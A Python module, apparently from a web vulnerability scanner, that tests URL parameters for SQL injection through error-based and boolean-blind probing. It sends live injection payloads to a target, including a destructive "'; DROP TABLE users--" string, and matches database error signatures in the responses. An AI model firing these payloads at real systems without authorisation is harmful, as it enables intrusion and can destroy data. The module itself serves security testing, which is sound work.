"""SQL Injection check — error-based and boolean-blind probing."""

from __future__ import annotations

import re
from urllib.parse import urlparse, parse_qs, urlencode, urlunparse

import httpx

from .base import BaseCheck, FindingDraft

_ERROR_PATTERNS = re.compile(
    r"sql syntax|mysql_fetch|ORA-\d{5}|sqlite_|pg_query|syntax error|unclosed quotation|"
    r"quoted string not properly terminated|SQLSTATE|mysqli_|PDOException|"
    r"microsoft ole db|odbc driver|jet database engine",
    re.I,
)

_BOOL_PAYLOADS = [
    ("' OR '1'='1", "' OR '1'='2"),
    ("1 OR 1=1", "1 OR 1=2"),
    ("' OR 1=1--", "' OR 1=2--"),
]

_ERROR_PAYLOADS = ["'", '"', "' OR 1=1--", "'; DROP TABLE users--"]


class SQLiCheck(BaseCheck):
    name = "sqli"
    description = "Probe for SQL injection via error messages and boolean-based differences"
    vuln_class = "SQLi"
    references = [
        "https://owasp.org/www-community/attacks/SQL_Injection",
        "https://cwe.mitre.org/data/definitions/89.html",
    ]
    applicable_categories = ["injection"]

    async def run(self, vector, client: httpx.AsyncClient, ai=None) -> list[FindingDraft]:
        findings: list[FindingDraft] = []
        url = vector.url
        params = vector.parameters

        if not params:
            return []

        parsed = urlparse(url)

        for param in params[:5]:
            # Error-based probing
            for payload in _ERROR_PAYLOADS:
                qs = parse_qs(parsed.query)
                qs[param] = [payload]
                test_url = urlunparse(parsed._replace(query=urlencode(qs, doseq=True)))

                try:
                    resp = await client.get(test_url)
                except Exception:
                    continue

                if _ERROR_PATTERNS.search(resp.text):
                    evidence = self._evidence_snippet(
                        f"GET {test_url}",
                        f"HTTP {resp.status_code}\n{resp.text[:500]}",
                    )
                    severity = "high"
                    if ai:
                        triage = ai.triage_finding(self.name, test_url, evidence)
                        if not triage.get("is_finding"):
                            continue
                        severity = triage.get("severity", "high")

                    findings.append(FindingDraft(
                        title=f"SQL Injection (error-based) in `{param}`",
                        vuln_class=self.vuln_class,
                        severity=severity,
                        url=url,
                        parameter=param,
                        description=f"SQL error triggered by payload `{payload}` in `{param}`.",
                        evidence=evidence,
                        references=self.references,
                    ))
                    break

            if any(f.parameter == param for f in findings):
                continue

            # Boolean-blind probing
            for true_payload, false_payload in _BOOL_PAYLOADS:
                qs = parse_qs(parsed.query)
                orig = qs.copy()

                qs[param] = [true_payload]
                true_url = urlunparse(parsed._replace(query=urlencode(qs, doseq=True)))
                qs[param] = [false_payload]
                false_url = urlunparse(parsed._replace(query=urlencode(qs, doseq=True)))

                try:
                    true_resp = await client.get(true_url)
                    false_resp = await client.get(false_url)
                except Exception:
                    continue

                # Significant response length difference suggests boolean-blind
                len_diff = abs(len(true_resp.text) - len(false_resp.text))
                if true_resp.status_code != false_resp.status_code or len_diff > 200:
                    evidence = (
                        f"TRUE payload `{true_payload}`: HTTP {true_resp.status_code}, "
                        f"{len(true_resp.text)} bytes\n"
                        f"FALSE payload `{false_payload}`: HTTP {false_resp.status_code}, "
                        f"{len(false_resp.text)} bytes\nDifference: {len_diff} bytes"
                    )
                    if ai:
                        triage = ai.triage_finding(self.name, url, evidence)
                        if not triage.get("is_finding"):
                            continue

                    findings.append(FindingDraft(
                        title=f"SQL Injection (boolean-blind) in `{param}`",
                        vuln_class=self.vuln_class,
                        severity="high",
                        url=url,
                        parameter=param,
                        description=(
                            f"Boolean-based response difference detected in `{param}`. "
                            f"Response length differs by {len_diff} bytes between true/false payloads."
                        ),
                        evidence=evidence,
                        references=self.references,
                    ))
                    break

        return findings
